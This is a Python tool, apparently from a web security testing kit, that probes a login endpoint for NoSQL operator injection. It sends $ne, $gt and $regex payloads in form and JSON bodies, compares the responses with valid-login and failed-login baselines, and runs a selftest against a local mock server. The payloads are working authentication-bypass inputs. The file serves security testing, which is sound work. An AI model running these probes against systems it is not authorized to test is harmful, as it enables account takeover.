#!/usr/bin/env python3
"""nosqli_probe.py — operator-injection matrix for one auth/filter endpoint.

web-nosqli's detect question is 'does the server parse operators in this
field' — measured, not inferred. This fires three baselines (known-good
credentials, known-bad credentials) then the operator forms in both
carriers: form encoding `user[$ne]=x`, and JSON `{"user":{"$ne":"x"}}`
with $ne / $gt / $regex variants. Each response is compared against BOTH
baselines (status, length, body signature); a case landing on the
success side is a channel CANDIDATE with the verbatim measurements —
never a finding, and the skill's own confirming probe still runs.

Safety: operator forms belong on read/auth paths only. A broad filter on
a write endpoint rewrites the collection — this tool refuses when the
target hints at writes unless --write-ok is passed.

    python3 tools/web/nosqli_probe.py --url http://h/login \
        --body 'user={M}&pass={P}' --good-user admin --good-pass secret
    python3 tools/web/nosqli_probe.py --url http://h/login --json \
        --user-field user --pass-field pass --good-user a --good-pass b
    python3 tools/web/nosqli_probe.py --selftest
"""
from __future__ import annotations

import argparse
import json
import sys
import time
import urllib.parse

import httpkit

_OPS = [{"$ne": "N0N3"}, {"$gt": ""}, {"$regex": ".*"}]
_WRITE_HINT = ("insert", "update", "delete", "set", "edit", "save", "write")


def _sig(r):
    body = r.get("body", "")
    if isinstance(body, bytes):
        body = body.decode("utf-8", "replace")
    return {"status": r.get("status"), "len": len(body),
            "sig": httpkit.body_signature(body) if body else None,
            "elapsed": r.get("_elapsed")}


def _fire(args, user_val, pass_val):
    """user_val/pass_val: str for form carrier, or dict operator for JSON."""
    if args.get("json"):
        u_field = args.get("user_field", "user")
        p_field = args.get("pass_field", "pass")
        body = json.dumps({u_field: user_val, p_field: pass_val})
        hdrs = dict(args.get("headers") or {})
        hdrs.setdefault("Content-Type", "application/json")
    else:
        def enc(field, val):
            if isinstance(val, dict):
                op, arg = next(iter(val.items()))
                return urllib.parse.urlencode({f"{field}[{op[1:]}]": arg})
            return urllib.parse.urlencode({field: val})
        body = enc("user", user_val) + "&" + enc("pass", pass_val)
        tpl = args.get("body")
        if tpl:
            u = user_val if isinstance(user_val, str) else urllib.parse.quote(
                json.dumps(user_val))
            p = pass_val if isinstance(pass_val, str) else urllib.parse.quote(
                json.dumps(pass_val))
            body = tpl.replace("{M}", u).replace("{P}", p)
        hdrs = args.get("headers")
    t0 = time.time()
    r = httpkit.request(args["url"], method=args.get("method", "POST"),
                        headers=hdrs, body=body,
                        timeout=args.get("timeout", 15))
    r["_elapsed"] = round(time.time() - t0, 3)
    r["_sent"] = body
    return r


def probe(args) -> dict:
    gu, gp = args["good_user"], args["good_pass"]
    url_l = args["url"].lower()
    if any(w in url_l for w in _WRITE_HINT) and not args.get("write_ok"):
        return {"refused": ("URL looks like a write path — operator filters "
                            "on writes rewrite the collection. Pass "
                            "--write-ok only if this endpoint is read-only "
                            "despite the name.")}
    good = _sig(_fire(args, gu, gp))
    bad = _sig(_fire(args, gu, gp + "WRONG"))
    out = {"url": args["url"], "baseline_good": good, "baseline_bad": bad,
           "cases": []}
    if good["sig"] == bad["sig"] and good["len"] == bad["len"]:
        out["note"] = ("good and bad baselines are indistinguishable — "
                       "this endpoint gives no oracle; record inconclusive")
    cand = []
    for carrier in ("json", "form"):
        sub = dict(args)
        sub["json"] = carrier == "json"
        if carrier == "form":
            sub["body"] = None
            sub["headers"] = None
        for op in _OPS:
            r = _fire(sub, op, op)
            s = _sig(r)
            like_good = (s["status"] == good["status"] and
                         (s["sig"] == good["sig"] or abs(s["len"] - good["len"]) <= 4))
            like_bad = (s["status"] == bad["status"] and s["sig"] == bad["sig"]
                        and abs(s["len"] - bad["len"]) <= 4)
            rec = {"carrier": carrier, "op": next(iter(op)), **s,
                   "matches_good": like_good, "matches_bad": like_bad}
            if like_good and not like_bad:
                cand.append(rec)
            out["cases"].append(rec)
    out["nosqli_candidates"] = cand
    out["candidate_only"] = True
    if not cand:
        out.setdefault("note",
                       "no operator form matched the success baseline — "
                       "record negative or inconclusive, not clean")
    return out


def _selftest() -> int:
    import threading
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

    class Db(BaseHTTPRequestHandler):
        def do_POST(self):
            n = int(self.headers.get("Content-Length", 0))
            raw = self.rfile.read(n).decode()
            ok = False
            if "json" in (self.headers.get("Content-Type") or ""):
                try:
                    d = json.loads(raw)
                    ok = (d.get("user") == "admin" and d.get("pass") == "pw") \
                         or isinstance(d.get("user"), dict)
                except Exception:
                    ok = False
            else:
                q = urllib.parse.parse_qs(raw, keep_blank_values=True)
                ok = q.get("user") == ["admin"] and q.get("pass") == ["pw"]
                ok = ok or any(k.startswith("user[") for k in q)
            self.send_response(200 if ok else 401)
            self.end_headers()
            self.wfile.write(b'{"ok":true,"user":"admin"}' if ok else b'{"ok":false}')

        def log_message(self, *_a):
            pass

    srv = ThreadingHTTPServer(("127.0.0.1", 0), Db)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    url = f"http://127.0.0.1:{srv.server_address[1]}/login"
    out = probe({"url": url, "method": "POST", "headers": {}, "timeout": 15,
                 "good_user": "admin", "good_pass": "pw", "json": True,
                 "user_field": "user", "pass_field": "pass"})
    srv.shutdown()
    ops = {c["op"] for c in out["nosqli_candidates"]}
    assert "$ne" in ops and "$regex" in ops, out
    print("nosqli_probe selftest: ok")
    return 0


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0],
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url")
    ap.add_argument("--method", default="POST", choices=["POST", "GET"])
    ap.add_argument("--body", help="form template; {M}=user slot, {P}=pass slot")
    ap.add_argument("--json", action="store_true", help="JSON carrier")
    ap.add_argument("--user-field", default="user")
    ap.add_argument("--pass-field", default="pass")
    ap.add_argument("--good-user")
    ap.add_argument("--good-pass")
    ap.add_argument("--headers", nargs="*")
    ap.add_argument("--timeout", type=float, default=15)
    ap.add_argument("--write-ok", action="store_true",
                    help="allow on a write-looking endpoint (read-only confirm)")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args(argv)
    if args.selftest:
        return _selftest()
    if not args.url or not args.good_user or not args.good_pass:
        ap.print_help()
        return 2
    a = vars(args) | {"headers": httpkit.parse_headers(args.headers)}
    if not a.get("json") and not a.get("body"):
        a["body"] = "user={M}&pass={P}"
    httpkit.jprint(probe(a))
    return 0


if __name__ == "__main__":
    sys.exit(main())
